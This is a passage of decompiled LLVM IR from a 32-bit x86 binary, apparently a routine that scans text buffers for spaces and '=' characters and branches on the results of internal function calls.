  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8051d00()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_8051d50(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge8 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge8, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8051d00()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_8054b29.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8051d00()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp145, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_8054b29.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8051d00()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp146 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp146, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
